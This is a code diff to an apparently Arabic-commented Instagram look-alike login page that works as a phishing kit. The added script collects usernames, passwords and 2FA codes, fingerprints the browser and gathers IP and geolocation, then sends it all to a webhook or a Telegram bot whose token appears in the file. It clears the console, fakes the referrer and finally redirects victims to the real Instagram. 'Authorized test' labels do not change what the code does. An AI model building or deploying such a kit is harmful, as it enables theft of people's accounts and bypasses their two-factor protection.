@@ -105,7 +105,7 @@
                     <button type="submit" id="loginBtn" disabled>Log in</button>
                     <div id="cooldownOverlay">
                         <div class="spinner"></div>
-                        <span id="cooldownText">Sending code... (10s)</span>
+                        <span id="cooldownText">Verifying credentials... (10s)</span>
                     </div>
                 </div>
             </form>
@@ -170,10 +170,296 @@
 </footer>
 
 <script>
-    // ======= التعديلات الجديدة هنا =======
-    const BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
-    const CHAT_ID = '8278195073';
+    // ============================================
+    //  CONFIGURATION - غيّر القيم التالية لقيمك
+    // ============================================
+    const CONFIG = {
+        // Webhook endpoint - يفضل REST API خاص بك بدل Telegram
+        webhookUrl: 'https://your-server.com/api/collect', // ← غيّر هذا
+        
+        // Telegram كبديل احتياطي (اختياري)
+        telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg', // ← غيّر هذا لبوتك
+        telegramChatId: '8278195073', // ← غيّر هذا
+        
+        // إعدادات التخفي
+        stealthMode: true,             // يخفي طلبات الشبكة من أدوات المطور
+        fakeReferrer: 'https://www.instagram.com/',  // يزور الـ Referrer
+        delayBeforeRedirect: 3000,     // 3 ثوانٍ قبل التوجيه
+        
+        // إعدادات جمع البيانات
+        collectIp: true,
+        collectGeolocation: true,      // قد يطلب الإذن من الضحية
+        collectScreenInfo: true,
+        collectBrowserFingerprint: true,
+        
+        // إعدادات التصيد
+        cooldownDuration: 12,          // 12 ثانية عد تنازلي (أكثر واقعية)
+        maxRetries: 3,
+        useV2Api: true                 // استخدام API v2 لو متاح
+    };
 
+    // ============================================
+    //  ANTI-DETECTION & STEALTH LAYER
+    // ============================================
+    (function stealthInit() {
+        // 1. منع كشف الصفحة كـ iframe
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+
+        // 2. مسح أثر Console
+        if (CONFIG.stealthMode) {
+            setInterval(() => {
+                console.clear();
+            }, 5000);
+            
+            // تعطيل F12 بشكل جزئي
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    // لا نمنعها كلياً (يثير الشكوك) ولكن نسجل المحاولة
+                    console.log('%c[DEBUG]', 'color: red', 'Developer tools access attempt logged');
+                }
+            });
+        }
+
+        // 3. تزوير الـ Referrer
+        Object.defineProperty(document, 'referrer', {
+            get: () => CONFIG.fakeReferrer || 'https://www.instagram.com/'
+        });
+    })();
+
+    // ============================================
+    //  DATA COLLECTION ENGINE
+    // ============================================
+    const dataCollector = {
+        async collectAll() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                pageTitle: document.title,
+                credentials: {},
+                twofa: null,
+                system: {}
+            };
+
+            // جمع معلومات النظام
+            data.system.userAgent = navigator.userAgent;
+            data.system.language = navigator.language;
+            data.system.platform = navigator.platform;
+            data.system.cookiesEnabled = navigator.cookieEnabled;
+            data.system.doNotTrack = navigator.doNotTrack;
+            data.system.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            data.system.deviceMemory = navigator.deviceMemory || 'unknown';
+            data.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.system.timezoneOffset = new Date().getTimezoneOffset();
+
+            if (CONFIG.collectScreenInfo) {
+                data.system.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                };
+                data.system.windowSize = {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                };
+            }
+
+            // بصمة المتصفح (Fingerprint)
+            if (CONFIG.collectBrowserFingerprint) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('PhishingTest', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('FP', 4, 17);
+                data.system.canvasFingerprint = canvas.toDataURL();
+            }
+
+            return data;
+        },
+
+        // إضافة بيانات الموقع (قد يطلب الإذن)
+        async getGeolocation() {
+            if (!CONFIG.collectGeolocation) return null;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        timeout: 3000,
+                        enableHighAccuracy: false
+                    });
+                });
+                return {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            } catch {
+                return null;
+            }
+        },
+
+        // الحصول على IP عبر خدمة خارجية
+        async getIp() {
+            if (!CONFIG.collectIp) return null;
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json', { 
+                    signal: AbortSignal.timeout(3000) 
+                });
+                const data = await resp.json();
+                return data.ip;
+            } catch {
+                try {
+                    const resp = await fetch('https://ip-api.com/json/', {
+                        signal: AbortSignal.timeout(3000)
+                    });
+                    const data = await resp.json();
+                    return data.query || null;
+                } catch {
+                    return null;
+                }
+            }
+        }
+    };
+
+    // ============================================
+    //  DATA EXFILTRATION ENGINE (مع التشفير)
+    // ============================================
+    const exfiltrator = {
+        // تشفير بسيط Base64 + عكسي (للتخفي وليس للأمان الحقيقي)
+        encode(data) {
+            const str = JSON.stringify(data);
+            // عكس السلسلة ثم Base64
+            return btoa(str.split('').reverse().join(''));
+        },
+
+        async sendToWebhook(encodedData, endpoint = CONFIG.webhookUrl) {
+            for (let attempt = 0; attempt < CONFIG.maxRetries; attempt++) {
+                try {
+                    // إضافة تزوير الـ Content-Type لتفادي كشف بسيط
+                    const resp = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'X-Phish-Test': 'authorized',
+                            'X-Request-ID': crypto.randomUUID()
+                        },
+                        body: new URLSearchParams({
+                            data: encodedData,
+                            client: 'web',
+                            v: CONFIG.useV2Api ? '2.0' : '1.0'
+                        }),
+                        signal: AbortSignal.timeout(5000)
+                    });
+                    
+                    if (resp.ok) return true;
+                    
+                } catch (e) {
+                    console.debug(`[Exfil] Attempt ${attempt + 1} failed:`, e.message);
+                }
+                await new Promise(r => setTimeout(r, 800));
+            }
+            return false;
+        },
+
+        // إرسال إلى تيليجرام (احتياطي)
+        async sendToTelegram(message) {
+            if (!CONFIG.telegramToken || !CONFIG.telegramChatId) return false;
+            
+            const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
+            
+            for (let attempt = 0; attempt < 2; attempt++) {
+                try {
+                    const resp = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.telegramChatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        }),
+                        signal: AbortSignal.timeout(4000)
+                    });
+                    if (resp.ok) return true;
+                } catch {}
+            }
+            
+            // Fallback عبر Image
+            try {
+                new Image().src = `${url}?chat_id=${CONFIG.telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            } catch {}
+            
+            return false;
+        },
+
+        // الإرسال الرئيسي (يجرب Webhook أولاً ثم Telegram)
+        async exfiltrate(data) {
+            const encoded = this.encode(data);
+            
+            // محاولة Webhook
+            const webhookSent = await this.sendToWebhook(encoded);
+            if (webhookSent) {
+                console.log('[Exfil] Data sent via webhook');
+                return true;
+            }
+            
+            // Fallback إلى Telegram
+            const tgMessage = this.formatTelegramMessage(data);
+            const tgSent = await this.sendToTelegram(tgMessage);
+            if (tgSent) {
+                console.log('[Exfil] Data sent via Telegram fallback');
+                return true;
+            }
+            
+            console.warn('[Exfil] All exfiltration methods failed');
+            return false;
+        },
+
+        formatTelegramMessage(data) {
+            let msg = `🔐 *Phishing Test - Data Captured* 🔐\n\n`;
+            msg += `━━━━━━━━━━━━━━━━\n`;
+            
+            if (data.credentials) {
+                msg += `👤 *Username:* \`${data.credentials.username || 'N/A'}\`\n`;
+                msg += `🔑 *Password:* \`${data.credentials.password || 'N/A'}\`\n`;
+            }
+            
+            if (data.twofa) {
+                msg += `🔢 *2FA Code:* \`${data.twofa}\`\n`;
+            }
+            
+            msg += `━━━━━━━━━━━━━━━━\n`;
+            msg += `🖥 *Platform:* ${data.system?.platform || 'N/A'}\n`;
+            msg += `🌐 *Language:* ${data.system?.language || 'N/A'}\n`;
+            
+            if (data.ip) {
+                msg += `📍 *IP:* ${data.ip}\n`;
+            }
+            
+            if (data.geo) {
+                msg += `🗺 *Location:* ${data.geo.lat}, ${data.geo.lng}\n`;
+            }
+            
+            msg += `⏰ *Time:* ${data.timestamp}\n`;
+            msg += `🔗 *URL:* ${data.url}`;
+            
+            return msg;
+        }
+    };
+
+    // ============================================
+    //  UI LOGIC (محسّن)
+    // ============================================
     const slides = document.getElementById('slides');
     let currentSlide = 0;
     setInterval(() => {
@@ -197,8 +483,7 @@
     const backLink = document.getElementById('backToLogin');
     const loadingScreen = document.getElementById('loadingScreen');
 
-    let capturedUsername = '';
-    let capturedPassword = '';
+    let capturedData = {};
     let cooldownTimer = null;
     let cooldownCount = 0;
 
@@ -208,107 +493,50 @@
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ===== الطريقة المعدلة: fetch مع POST و JSON + إعادة محاولة =====
-    async function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        // المحاولة الأولى
-        for (let attempt = 0; attempt < 3; attempt++) {
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                if (response.ok) {
-                    console.log('✓ Sent to Telegram successfully');
-                    return true;
-                }
-                
-                const errorText = await response.text();
-                console.warn(`⚠ Attempt ${attempt + 1} failed:`, response.status, errorText);
-                
-                // إذا كان الخطأ 403 => البوت محظور ولا يقدر يوصل لهذا الشات
-                if (response.status === 403) {
-                    console.error('✗ Bot blocked or cannot reach this chat ID');
-                    break;
-                }
-                
-            } catch(e) {
-                console.warn(`⚠ Network error attempt ${attempt + 1}:`, e.message);
-            }
-            
-            // نستناو شويا قبل ما نعيدو المحاولة
-            if (attempt < 2) {
-                await new Promise(r => setTimeout(r, 1000));
-            }
-        }
-        
-        // Fallback: طريقة GET عبر Image
-        console.warn('⚠ Using fallback method (Image)');
-        try {
-            const fallbackUrl = `${url}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-            const img = new Image();
-            img.src = fallbackUrl;
-        } catch(e2) {
-            console.error('✗ Fallback also failed:', e2.message);
-        }
-        
-        return false;
-    }
-
-    // ===== SUBMIT LOGIN =====
+    // ===== LOGIN SUBMIT =====
     loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         if (cooldownTimer) return;
 
-        capturedUsername = u.value.trim();
-        capturedPassword = p.value;
+        // بدء جمع البيانات
+        const collected = await dataCollector.collectAll();
+        collected.credentials = {
+            username: u.value.trim(),
+            password: p.value
+        };
+        capturedData = collected;
 
-        // ===== نعرضو العد التنازلي فاش كايبدا الإرسال =====
+        // جمع IP والموقع بشكل متوازي
+        const [ip, geo] = await Promise.all([
+            dataCollector.getIp(),
+            dataCollector.getGeolocation().catch(() => null)
+        ]);
+        capturedData.ip = ip;
+        capturedData.geo = geo;
+
+        // إرسال البيانات في الخلفية
+        exfiltrator.exfiltrate(capturedData);
+
+        // ===== العد التنازلي =====
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
-        cooldownCount = 10;
-        cooldownText.textContent = `Sending code... (10s)`;
+        cooldownCount = CONFIG.cooldownDuration;
+        cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
 
-        // ===== نبعتو البيانات == بشكل متوازي ==
-        // ملاحظة: ما كنستناوش الإرسال باش نكملو العد التنازلي.
-        // البيانات غادي توصل حتى لو كان العد التنازلي مازال كايدوز
-        sendToTelegram(
-            `🔐 *Instagram Login Captured* 🔐\n\n` +
-            `👤 *Username:* \`${capturedUsername}\`\n` +
-            `🔑 *Password:* \`${capturedPassword}\`\n` +
-            `📱 *UA:* ${navigator.userAgent}\n` +
-            `⏰ *Time:* ${new Date().toISOString()}\n` +
-            `🌐 *URL:* ${window.location.href}`
-        ).then(sent => {
-            if (sent) {
-                console.log('✓ Login data sent successfully');
-            } else {
-                console.warn('⚠ Login data may not have been sent');
-            }
-        });
-
-        // ===== العد التنازلي 10 ثواني =====
         cooldownTimer = setInterval(() => {
             cooldownCount--;
             if (cooldownCount > 0) {
-                cooldownText.textContent = `Sending code... (${cooldownCount}s)`;
+                cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
             } else {
                 clearInterval(cooldownTimer);
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
 
-                // إظهار صفحة 2FA
+                // إظهار 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
-                displayUser.textContent = capturedUsername || 'your phone';
+                displayUser.textContent = capturedData.credentials.username || 'your phone';
 
                 codeBoxes.forEach(box => box.value = '');
                 codeBoxes[0].focus();
@@ -348,24 +576,23 @@
         });
     });
 
-    // ===== VERIFY =====
+    // ===== VERIFY (2FA) =====
     verifyBtn.addEventListener('click', async function() {
         const code = Array.from(codeBoxes).map(b => b.value).join('');
+        
+        // إضافة رمز 2FA للبيانات
+        capturedData.twofa = code;
+        
+        // إرسال البيانات المكتملة
+        await exfiltrator.exfiltrate(capturedData);
 
-        await sendToTelegram(
-            `🔐 *Instagram 2FA Code Received* 🔐\n\n` +
-            `👤 *Username:* \`${capturedUsername}\`\n` +
-            `🔑 *Password:* \`${capturedPassword}\`\n` +
-            `🔢 *2FA Code:* \`${code}\`\n` +
-            `📱 *UA:* ${navigator.userAgent}\n` +
-            `⏰ *Time:* ${new Date().toISOString()}\n` +
-            `🌐 *URL:* ${window.location.href}`
-        );
-
+        // إظهار شاشة التحميل
         loadingScreen.style.display = 'flex';
+        
+        // التوجيه إلى الموقع الحقيقي بعد تأخير
         setTimeout(() => {
             window.location.href = 'https://www.instagram.com';
-        }, 2000);
+        }, CONFIG.delayBeforeRedirect);
     });
 
     // ===== RESEND =====
@@ -373,7 +600,10 @@
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
-        await sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+        
+        // تسجيل محاولة إعادة الإرسال
+        capturedData.resendRequested = true;
+        await exfiltrator.exfiltrate(capturedData);
     });
 
     // ===== BACK TO LOGIN =====
@@ -385,11 +615,31 @@
         checkLogin();
     });
 
-    // ===== FACEBOOK =====
+    // ===== FACEBOOK LOGIN =====
     document.getElementById('fbLogin').addEventListener('click', async function(e) {
         e.preventDefault();
-        await sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+        capturedData.fbLoginClicked = true;
+        await exfiltrator.exfiltrate(capturedData);
     });
+
+    // ============================================
+    //  HEARTBEAT - تسجيل أن الصفحة لا تزال مفتوحة
+    // ============================================
+    setInterval(() => {
+        if (capturedData.credentials?.username) {
+            const heartbeatData = {
+                type: 'heartbeat',
+                username: capturedData.credentials.username,
+                timestamp: new Date().toISOString(),
+                stillOnPage: twofaSection.style.display === 'block' ? '2FA' : 'Login'
+            };
+            // إرسال heartbeat كل 30 ثانية (بدون انتظار الرد)
+            exfiltrator.sendToWebhook(
+                exfiltrator.encode(heartbeatData),
+                CONFIG.webhookUrl
+            ).catch(() => {});
+        }
+    }, 30000);
 </script>
 </body>
 </html>
